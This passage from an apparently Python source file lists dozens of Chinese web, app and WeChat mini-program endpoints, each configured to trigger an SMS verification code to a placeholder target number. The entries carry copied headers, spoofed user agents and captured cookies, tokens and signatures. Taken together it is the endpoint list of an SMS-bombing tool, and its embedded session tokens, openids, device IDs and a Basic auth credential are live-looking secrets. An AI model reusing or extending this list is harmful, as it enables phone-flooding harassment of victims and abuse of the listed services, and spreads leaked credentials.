        "headers": {
            "Host": "qcty.crscl.com.cn",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "appsign": "1e6dcc704d2479fb758c8c1fda241a91",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "timestamp": "__TIMESTAMP__",
            "Referer": "https://servicewechat.com/wx2a68df8c778b639b/61/page-frame.html",
        },
        "data": "{\"mobileNumber\":\"__PHONE__\"}",
    },
    {
        "name": "ylt56.com",
        "method": "POST",
        "url": "https://www.ylt56.com/validate_code.do",
        "headers": {
            "Host": "www.ylt56.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "accept": "application/json",
            "Referer": "https://servicewechat.com/wx8a7568b39073e374/86/page-frame.html",
        },
        "data": "phone_num=__PHONE__",
    },
    {
        "name": "rihapi.rwjiankang.com",
        "method": "GET",
        "url": "https://rihapi.rwjiankang.com/mobile/getRegisterCode?mobile=__PHONE__&thirdEnv=1&userFrom=1",
        "headers": {
            "Host": "rihapi.rwjiankang.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "thirdenv": "1",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "access-token": "e5a7a15927934fc4b74dbda078b1e490",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "inlet": "ypqjswszx",
            "Referer": "https://servicewechat.com/wxefea52822f229877/2/page-frame.html",
        },
    },
    {
        "name": "dingdangyjh.com",
        "method": "GET",
        "url": "https://dingdangyjh.com/mallapi/phone/code?type=1&phone=__PHONE__",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "live-server.yinghecloud.com",
        "method": "POST",
        "url": "https://live-server.yinghecloud.com/api/v1/common/sendPhoneCode",
        "headers": {
            "Host": "live-server.yinghecloud.com",
            "Connection": "keep-alive",
            "traceid": "qs41d9522062046b3cfd49e190ee61",
            "charset": "utf-8",
            "role": "10",
            "latitude": "",
            "User-Agent": "__UA__",
            "platformid": "yjt",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "version": "1.2.01",
            "platform": "wx-mini",
            "network": "wifi",
            "share_id": "1",
            "authorization": "Bearer",
            "system": "Android 15",
            "model": "V2403A",
            "content-type": "application/json",
            "osversion": "15",
            "loginappid": "10020",
            "brand": "vivo",
            "osname": "android",
            "longitude": "",
            "Referer": "https://servicewechat.com/wx87852a2ac8a9a856/40/page-frame.html",
        },
        "data": "{\"phone\":\"__PHONE__\",\"role\":10,\"type\":7,\"reset\":true}",
    },
    {
        "name": "svip.bgjtsvip.com",
        "method": "POST",
        "url": "https://svip.bgjtsvip.com/api/send_code",
        "headers": {
            "Host": "svip.bgjtsvip.com",
            "Connection": "keep-alive",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "merchant-id": "57",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "store-id": "479",
            "token": "",
            "Referer": "https://servicewechat.com/wx7966dac6db63ed45/60/page-frame.html",
        },
        "data": "{\"mobile\":\"__PHONE__\",\"scene\":2}",
    },
    {
        "name": "app.yae111.com",
        "method": "GET",
        "url": "https://app.yae111.com/base/getLoginSms?phone=__PHONE__",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "api-salus.yaoud.cn",
        "method": "GET",
        "url": "https://api-salus.yaoud.cn/infra/register/getAuthCode/__PHONE__",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "srv-uzone.bcpmdata.com",
        "method": "POST",
        "url": "https://srv-uzone.bcpmdata.com/message/send",
        "headers": {
            "Host": "srv-uzone.bcpmdata.com",
            "Connection": "keep-alive",
            "bcpm-platform": "miniprogram",
            "charset": "utf-8",
            "app-id": "LkdJdgSm",
            "User-Agent": "__UA__",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "platform": "mp-weixin",
            "Referer": "https://servicewechat.com/wx9b8ad01a7a6f82af/119/page-frame.html",
        },
        "data": "{\"area_code\":\"86\",\"phone\":\"__PHONE__\"}",
    },
    {
        "name": "gcxy8.com",
        "method": "GET",
        "url": (
            "https://gcxy8.com/cnexam/miniApi/appUser/officialAccounts/member/registerSendToMobile?"
            "phonenumber=__PHONE__"
        ),
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "api.medlive.cn",
        "method": "POST",
        "url": "https://api.medlive.cn/v2/user/register/user_open_mobile_code_applet.php",
        "headers": {
            "Host": "api.medlive.cn",
            "Connection": "keep-alive",
            "authorization": "",
            "charset": "utf-8",
            "User-Agent": "__UA__",
            "content-type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "Referer": "https://servicewechat.com/wxee6b2a17a0ad2720/4/page-frame.html",
        },
        "data": "mobile=__PHONE__&resource=applet&app_name=drug_applet&timestamp=__TIMESTAMP__",
        "cookies": {
            "ymtinfo": (
                "eyJ1aWQiOiIiLCJyZXNvdXJjZSI6Im1pbmlwcm9ncmFtIiwiYXBwX25hbWUyIjoiZHJ1Z19taW5pcHJvZ3JhbSIsImV4dF92ZXJz"
                "aW9uIjoiMiIsInVuaW9uaWQiOiIifQ=="
            ),
        },
    },
    {
        "name": "ycx.cqmetro.cn",
        "method": "POST",
        "url": "https://ycx.cqmetro.cn/bas/mc/v1/send-sms-code",
        "headers": {
            "Host": "ycx.cqmetro.cn",
            "Content-Type": "application/json",
            "signature": (
                "Jsz+LXqnwqX2bghxG7QmumvxMMYXtIu1E3/dgYE7qgLDdgggleV711ATvebklUEWzvppqpKTFxvK4v9uAKwaZQj+xNF4e8LCftuA"
                "h2iouphUyJqIz39JMRNS7PxvzfntiC9rh8POX84LLwvYjOzISEB2+eE1+N2+DBENnA3Pfys="
            ),
            "Referer": "https://servicewechat.com/wxa17aea49c17829df/8/page-frame.html",
        },
        "data": {"mobile_phone": "__PHONE__", "sms_type": "0"},
    },
    {
        "name": "168api-tyxcx.zaiguahao.com",
        "method": "POST",
        "url": "https://168api-tyxcx.zaiguahao.com/api/common/smsSend",
        "headers": {
            "Host": "168api-tyxcx.zaiguahao.com",
            "Content-Type": "application/json",
            "openid": "oV6zA6w65irzV1-yy9fI-q2XoQfs",
        },
        "data": {"applets_id": 1352, "phone": "__PHONE__"},
    },
    {
        "name": "xcx.kuaidizs.cn",
        "method": "POST",
        "url": "https://xcx.kuaidizs.cn/xcx/identity/sendCapcha",
        "headers": {
            "Host": "xcx.kuaidizs.cn",
            "Content-Type": "application/json",
            "token": "2da74f341fa94690a8e7318ab8682605oV0yQ4o5tAp-Gkp9tMFJH8YWs1oE",
        },
        "data": {"phone": "__PHONE__"},
    },
    {
        "name": "p.kuaidi100.com",
        "method": "POST",
        "url": "https://p.kuaidi100.com/xcx/sms/sendcode",
        "headers": {
            "Host": "p.kuaidi100.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": "https://servicewechat.com/wx1dd3d8b53b02d7cf/553/page-frame.html",
        },
        "data": "name=__PHONE__&validcode=",
    },
    {
        "name": "101s.com.cn",
        "method": "POST",
        "url": "https://www.101s.com.cn/prod-api/memorial_hall/user/send",
        "headers": {
            "Host": "www.101s.com.cn",
            "Content-Type": "application/json",
            "Referer": "https://servicewechat.com/wxff5c9882b5e61d35/9/page-frame.html",
        },
        "data": {"phone": "__PHONE__"},
    },
    {
        "name": "api.xinhualeyu.com",
        "method": "GET",
        "url": "https://api.xinhualeyu.com/uums/account/sendSms?loginType=1&mobile=__PHONE__&operaType=1",
        "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"},
    },
    {
        "name": "game.hosian.com",
        "method": "POST",
        "url": "https://game.hosian.com/api/sms",
        "headers": {
            "Host": "game.hosian.com",
            "Accept": "*/*",
            "Authorization": "",
            "clientId": "",
            "locale": "zh",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": "application/json",
            "tenantId": "0",
            "lang": "zh_CN",
            "Connection": "keep-alive",
            "sign": "267670e6d840493d6a252e44bc86805bb3a8aab0740c436a5e600c557f197fdb",
            "User-Agent": "__UA__",
        },
        "data": {"phone": "__PHONE__"},
    },
    {
        "name": "scm.qlx56.com",
        "method": "POST",
        "url": "http://scm.qlx56.com/gateway/scm-basic/v1/msgRecord/sendAuthCode",
        "headers": {
            "Host": "scm.qlx56.com",
            "Content-Type": "application/json; charset=UTF-8",
            "User-Agent": "__UA__",
        },
        "data": {"mobile": "__PHONE__", "tenantCode": "60087", "openId": "oapZHs4qwfJJEXDIrFhnx62bPDiY"},
    },
    {
        "name": "passport.xag.cn",
        "method": "POST",
        "url": "https://passport.xag.cn/home/sms_code",
        "headers": {
            "Host": "passport.xag.cn",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "__UA__",
        },
        "data": "icc=86&phone=__PHONE__",
    },
    {
        "name": "api.kucee.com",
        "method": "POST",
        "url": "https://api.kucee.com/website.Access/getPhoneCode",
        "headers": {"Host": "api.kucee.com", "Content-Type": "application/json", "User-Agent": "__UA__"},
        "data": {"phone": "__PHONE__", "type": "1", "storeId": "0"},
    },
    {
        "name": "sso.zlgx.com",
        "method": "POST",
        "url": "https://sso.zlgx.com/api/v2/sms/sendVerificationCode",
        "headers": {
            "Host": "sso.zlgx.com",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "__UA__",
        },
        "data": {"params": {"phone": "__PHONE__", "platfromCode": "fpop"}},
    },
]


# ==================== 第二批：App / H5 短信接口（后续补充的 44 个） ====================

EXTRA_ENDPOINTS: list[Endpoint] = [
    {
        "name": "api.pencilnews.cn",
        "method": "POST",
        "url": "https://api.pencilnews.cn/sms/send",
        "headers": {
            "Host": "api.pencilnews.cn",
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "sa-super-property": (
                "{\"manufacturer\":\"APPLE\",\"model\":\"iPhone12,1\",\"wifi\":true,\"screen_height\":\"812.000000\","
                "\"screen_width\":\"375.000000\",\"network_type\":\"\"}"
            ),
            "Accept": "*/*",
            "version": "2.9.9",
            "User-Agent": "PencilNews/2.9.9 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "data": {"phone": "__PHONE__", "sms_type": "reg"},
    },
    {
        "name": "as.hypergryph.com",
        "method": "POST",
        "url": "https://as.hypergryph.com/general/v1/send_phone_code",
        "headers": {
            "Host": "as.hypergryph.com",
            "Accept": "*/*",
            "Sec-Fetch-Site": "same-site",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Mode": "cors",
            "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://www.hypergryph.com",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://www.hypergryph.com/",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Cookie": (
                "_ga=GA1.1.595367902.1770209761; _ga_V0ZVS049N5=GS2.1.s1770209760$o1$g1$t1770211278$j60$l0$h0; "
                "HMACCOUNT=49E6075557076A09; Hm_lpvt_24d8cd20e5a3728877d88996f22d3eaf=1770211278; "
                "Hm_lvt_24d8cd20e5a3728877d88996f22d3eaf=1770209760,1770211278"
            ),
        },
        "data": {"phone": "__PHONE__", "type": 2},
    },
    {
        "name": "gfwj168.com",
        "method": "GET",
        "url": "https://www.gfwj168.com/api/v1_1/UCenter/sendYzm?phone=__PHONE__",
        "headers": {
            "Host": "www.gfwj168.com",
            "Connection": "keep-alive",
            "token": "",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wxc8910655f8204472/105/page-frame.html",
        },
    },
    {
        "name": "h5-applets.77ircloud.com",
        "method": "GET",
        "url": (
            "https://h5-applets.77ircloud.com/tmini/authservice/sms-verifyCodes?checkPassPort=false&"
            "mobileOrEmail=__PHONE__&productScene=2&tenantId=3463567&type=6"
        ),
        "headers": {
            "Host": "h5-applets.77ircloud.com",
            "Connection": "keep-alive",
            "x-mini-org-id": "3463567",
            "ot": "3463567,9223090561878065152",
            "unCheckLoginMutex": "true",
            "content-type": "application/json",
            "Authorization": (
                "eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyMDUxMDIzOTA4MDcwODE2Iiwic3ViIjoie1widWlkXCI6MjA1MTAyMzkwODA3MDgxNix"
                "cInVzZXJOYW1lXCI6XCJcIixcInVzZXJUeXBlXCI6MSxcInNcIjpudWxsLFwidGJcIjpudWxsLFwiZGJpZFwiOjM0NjM1Njd9Iiw"
                "iZXhwIjoxNzcwODE2MzI2fQ.71A_cPBcK79uIezeZpzJMoW9ezX4_3lgyRhM4mcA8mg"
            ),
            "X-Open-Id": "o0l5a5BidFmFs5GehTKhqMGmLJSk",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx00b50e862c9dd46c/53/page-frame.html",
        },
    },
    {
        "name": "oms.gdqyqx.com",
        "method": "POST",
        "url": "https://oms.gdqyqx.com/qyqx-oms-api/app/user/sendAuthCode",
        "headers": {
            "Host": "oms.gdqyqx.com",
            "Connection": "keep-alive",
            "accessToken": "",
            "content-type": "application/json",
            "terminal": "2",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx317cf609e6eef82d/228/page-frame.html",
        },
        "data": {"type": 1, "userName": "__PHONE__"},
    },
    {
        "name": "mpapi.toybaba.com",
        "method": "POST",
        "url": "https://mpapi.toybaba.com/Code/Send",
        "headers": {
            "Host": "mpapi.toybaba.com",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx8c07a51bbe5663c0/139/page-frame.html",
        },
        "data": {"phone": "__PHONE__", "type": 0, "token": ""},
    },
    {
        "name": "gateway.iskytrip.com",
        "method": "POST",
        "url": "https://gateway.iskytrip.com/api/user/usermanger/getPhoneVerify",
        "headers": {
            "Host": "gateway.iskytrip.com",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx5e3a6a1c50ee7515/437/page-frame.html",
        },
        "data": {
            "header": {
                "appId": "60101",
                "channelSource": "100",
                "clientName": "在机场plus微信小程序",
                "clientVersion": "2.7.2.8",
                "customerData": "",
                "deviceType": "3",
                "timestamp": 1770213729122,
                "token": "",
                "uid": "",
                "deviceId": "980fc4c7-500c-4f65-8b42-fcf616148834",
                "version": "v1.0.0",
                "scene": "",
            },
            "request": "__PHONE__",
        },
    },
    {
        "name": "wj.cong.gsxetc.cn",
        "method": "POST",
        "url": "https://wj.cong.gsxetc.cn/index/common/send_code",
        "headers": {
            "Host": "wj.cong.gsxetc.cn",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "authorization": "",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx207c9f0330042ec0/22/page-frame.html",
        },
        "data": {"phone": "__PHONE__"},
    },
    {
        "name": "ride-platform.hellobike.com",
        "method": "POST",
        "url": "https://ride-platform.hellobike.com/api?saas.user.auth.sendCode",
        "headers": {
            "Host": "ride-platform.hellobike.com",
            "Connection": "keep-alive",
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wxe6a2c6256e291dc9/22/page-frame.html",
        },
        "data": {
            "riskControlData": {},
            "version": "6.98.0",
            "releaseVersion": "6.98.0",
            "systemCode": "306",
            "appName": "AppHelloMiniBrand",
            "mobileModel": "iPhone 11<iPhone12,1>",
            "weChatVersion": "8.0.68",
            "mobileSystem": "iOS 18.7",
            "SDKVersion": "3.14.1",
            "systemPlatform": "ios",
            "from": "wechat",
            "mobile": "__PHONE__",
            "tenantId": "t_chn_xgddc",
            "source": "0",
            "challenge": "u9SX2n",
            "action": "saas.user.auth.sendCode",
            "h5Version": "6.98.0",
        },
    },
    {
        "name": "rentapi.topshopstv.com",
        "method": "GET",
        "url": (
            "https://rentapi.topshopstv.com/api/smsCode/bindMobileToMember?mobileNumber=__PHONE__&"
            "feiyurent_appid=3"
        ),
        "headers": {
            "Host": "rentapi.topshopstv.com",
            "Connection": "keep-alive",
            "feiyurent-useragent": (
                "feiyurent://5.7.0(iPhone 11<iPhone12,1>;iOS 18.7;zh_CN;ID:3-954a6aa452861b280027efa8b53a0743-3.14.1-"
                "wxapp)"
            ),
            "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx3074d9061f89c695/353/page-frame.html",
        },
    },
    {
        "name": "api.chexiaoge.com",
        "method": "POST",
        "url": "https://api.chexiaoge.com/open-api/user/auth/sendLoginVerifyCode",
        "headers": {
            "Host": "api.chexiaoge.com",
            "Connection": "keep-alive",
            "channel": "WeChatApp",
            "systemType": "IOS",
            "content-type": "application/json",
            "version": "V3.2.28",
            "partySource": "WeChatApp",
            "x-Token": "",
            "chege-referer": "packageA/login/login",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004431) NetType/4G Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wxa660e396d4f0a8e9/479/page-frame.html",
        },
        "data": {"mobile": "__PHONE__"},
    },
    {
        "name": "zjappserver.xkw.com",
        "method": "POST",
        "url": "https://zjappserver.xkw.com/app-server/v1/user/sendSmsCode",
        "headers": {
            "Host": "zjappserver.xkw.com",
            "Accept": "*/*",
            "zjapp-check": (
                "1770261701||ios||1AC2A9D5-1767-466D-BB5F-294F84C48D64||zj.app||"
                "04F808DCD640757AEDADFB1AC914084899FD659FAC6FFB5619830032C38CB06C"
            ),
            "zjapp-version": "2.14.0",
            "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
            "zjapp-device-brand": "iPhone",
            "Accept-Language": "zh-Hans-CN;q=1.0",
            "zjapp-system-model": "iPhone 11",
            "zjapp-system-version": "18.7",
            "User-Agent": "ZuJuan/2.14.0 (com.xkw.zujuan; build:3; iOS 18.7.0) Alamofire/5.5.0",
            "zjapp-sub-system": "iOS",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Cookie": "acw_tc=76b20f8a17702616886488842ea2920a301fe3b6f0421660d534e90302ad0a",
        },
        "data": {"templateType": "LOGIN", "phone": "__PHONE__"},
    },
    {
        "name": "api.shentingedu.com",
        "method": "POST",
        "url": "https://api.shentingedu.com/index/authorize/sms_action",
        "headers": {
            "Host": "api.shentingedu.com",
            "system": "1",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Content-Type": "application/json",
            "currentTime": "1773450441838",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app"
            ),
            "Connection": "keep-alive",
            "systemType": "app",
        },
        "data": {"mobile": "__PHONE__"},
    },
    {
        "name": "api.gowithtommy.com",
        "method": "POST",
        "url": "https://api.gowithtommy.com/rest/user/register_by_phone/",
        "headers": {
            "Host": "api.gowithtommy.com",
            "Content-Type": "application/json",
            "Cookie": "sl-session=gSbAc0N+hWk+LukZ4omHPA==",
            "Connection": "keep-alive",
            "If-None-Match": "",
            "Accept": "*/*",
            "User-Agent": "mjttSwift/11.0.8 (com.Tommy.mjtt; build:1; iOS 18.7.0) Alamofire/4.7.3",
            "Accept-Language": "zh-Hans-CN;q=1.0",
            "Accept-Encoding": "gzip;q=1.0, compress;q=0.5",
        },
        "data": {"phone_num": "+86__PHONE__"},
    },
    {
        "name": "hudson-prod.localhome.cn",
        "method": "POST",
        "url": "https://hudson-prod.localhome.cn/user/auth-code/mobile",
        "headers": {
            "Host": "hudson-prod.localhome.cn",
            "Connection": "keep-alive",
            "Accept": "application/json, text/plain, */*",
            "APP_PLATFORM": "9",
            "channelId": "34",
            "content-type": "application/json; charset=UTF-8",
            "APP_BRAND": "iPhone",
            "APP_VERSION": "3.17.1",
            "appId": "wx847d6fc0bdcbf6c2",
            "APP_MODEL": "iPhone 11<iPhone12,1>",
            "APP_SOURCE": "1",
            "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004431) NetType/WIFI Language/zh_CN"
            ),
            "Referer": "https://servicewechat.com/wx847d6fc0bdcbf6c2/110/page-frame.html",
        },
        "data": {"mobile": "__PHONE__", "areaCode": "86"},
    },
    {
        "name": "api.youzijianzhi.com",
        "method": "POST",
        "url": "https://api.youzijianzhi.com/api/v1/sms/code",
        "headers": {
            "Host": "api.youzijianzhi.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "keep-alive",
            "Accept": "application/json",
            "User-Agent": "YouZiJianZhi/1.0.3 (com.zimi.YouZiJianZhi; build:10; iOS 18.7.0) Alamofire/5.11.0",
            "Accept-Language": "zh-Hans-CN;q=1.0",
            "Accept-Encoding": "br;q=1.0, gzip;q=0.9, deflate;q=0.8",
        },
        "data": "mobile=__PHONE__&platform=1&send_key=LOGIN_CODE",
    },
    {
        "name": "v4.passport.sohu.com",
        "method": "GET",
        "url": (
            "https://v4.passport.sohu.com/i/smcode/mobile/v2/signin?captchaType=signin&mobile=__PHONE__&way=0&"
            "pagetoken=1773450441838&appid=116006&callback=passport4014_cb1773450441836&_=1773450441839"
        ),
        "headers": {
            "Host": "v4.passport.sohu.com",
            "Sec-Fetch-Dest": "script",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Version/18.7 Mobile/15E148 Safari/604.1"
            ),
            "Accept": "*/*",
            "Referer": (
                "https://m.sohu.com/login/normal?origin=1&r=https%3A%2F%2Fm.sohu.com%2F%3Fpvid%3D000115_3w_index%26ju"
                "mp%3Dfront&type=1"
            ),
            "Sec-Fetch-Site": "same-site",
            "Sec-Fetch-Mode": "no-cors",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Priority": "u=1, i",
            "Accept-Encoding": "gzip, deflate, br",
            "Cookie": (
                "t=1773450441836; vt_smwp_home=7; _dfp=IMe4nZZocUv2P+N+IHIjGcx681os1wyUSs9SDcR8yF4=; "
                "cld=20260205194215; clt=1773450441; reqtype=h5; SUV=1773450439836odinRzq0; "
                "gidinf=x09998010101193cceccef05400022fdbdcaa31c3330"
            ),
            "Connection": "keep-alive",
        },
    },
    {
        "name": "pai.yihaopingji.com",
        "method": "GET",
        "url": "https://pai.yihaopingji.com/index.php?act=index&op=getauthcode&mobile=__PHONE__",
        "headers": {
            "Host": "pai.yihaopingji.com",
            "X-Requested-With": "XMLHttpRequest",
            "Sec-Fetch-Site": "same-origin",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Mode": "cors",
            "Accept": "application/json",
            "User-Agent": (
                "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML,"
                " like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004431) NetType/4G Language/zh_CN"
            ),
            "Connection": "keep-alive",
            "Referer": "https://pai.yihaopingji.com/index.php?act=my&op=editinfo&type=mobile",
            "Cookie": "user_id=812775; PHPSESSID=o8p4fm7t5lp8v9nerfsuaaa1s6",
            "Sec-Fetch-Dest": "empty",
        },
    },
    {
        "name": "cms.sctvcloud.com:37443",
        "method": "POST",
        "url": "https://cms.sctvcloud.com:37443/api/oauth/client/anno/authcode",
        "headers": {
            "Host": "cms.sctvcloud.com:37443",
            "Authorization": "Basic c2N0dl91aTpzY3R2X3VpX3NlY3JldA==",
            "Accept": "*/*",
            "timestamp": "1773450441839",
            "appVersion": "7.2.0",
            "Accept-Encoding": "gzip, deflate, br",
            "tenant": "YzA3MDA=",
            "Accept-Language": "zh-Hans-CN;q=1",
            "Content-Type": "application/json",
            "User-Agent": "SCDistrict/7.2.0 (iPhone; iOS 18.7; Scale/2.00)",
            "Connection": "keep-alive",
        },
        "data": {"phone": "__PHONE__", "authCodeType": "register"},
    },
    {
        "name": "id.getkwai.com",
        "method": "POST",
        "url": "https://id.getkwai.com/pass/m2u/sms/code",
        "headers": {
            "Host": "id.getkwai.com",
            "Content-Type": "application/json",
            "Cookie": (
                "appver=4.72.0; did=IOS_39B1A8E4-C713-468C-AE12-4B55FDA4B537; idfa=; kpf=IPHONE; kpn=M2U; "
                "language=zh-CN; m2u.api.visitor_st=; m2u.api_st=; mod=iPhone12,"
                "1; net=4g; passToken=; sys=iOS_18.7; userId="
            ),
            "Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": "1tianCam/4.72.0 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "data": {"phone": "__PHONE__", "countryCode": "+86", "type": 400},
    },
    {
        "name": "starrypro.lastsurvivor.cn",
        "method": "POST",
        "url": "https://starrypro.lastsurvivor.cn/starry/fetchVerifyCode",
        "headers": {
            "Host": "starrypro.lastsurvivor.cn",
            "version": "ios|2.11.14|477",
            "Accept": "*/*",
            "channel": "iOS",
            "userid": "",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "token": "",
            "Content-Type": "application/x-www-form-urlencoded",
            "deviceid": "8A3DBB5F-4752-44B5-92A5-F8477922031A",
            "osmodel": "iPhone 11",
            "oaid": "",
            "Content-Length": "43",
            "User-Agent": "iPhone12,1(iOS/18.7) WeexGroup(",
            "distinctid": "34C2DC4D-01DF-46D9-9EF4-95FE199CC826_2",
            "osversion": "18.7",
            "Connection": "keep-alive",
        },
        "data": "data=%7B%22mobile%22%3A%22__PHONE__%22%7D",
    },
    {
        "name": "ai.growingth.com",
        "method": "POST",
        "url": "https://ai.growingth.com/rich/user/send-sms",
        "headers": {
            "Host": "ai.growingth.com",
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "API-Version": "1",
            "Accept": "*/*",
            "User-Agent": "wang luo jian zhi/1.1 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1",
            "Accept-Encoding": "gzip, deflate, br",
        },
        "data": {"appid": "videoCut02", "appVersion": "1", "phone": "__PHONE__"},
    },
    {
        "name": "ku.zrb.net",
        "method": "POST",
        "url": "https://ku.zrb.net/api/Jzk/JzkSendSmsNew",
        "headers": {
            "Host": "ku.zrb.net",
            "Content-Type": "application/json",
            "Connection": "keep-alive",
            "Accept": "*/*",
            "User-Agent": (
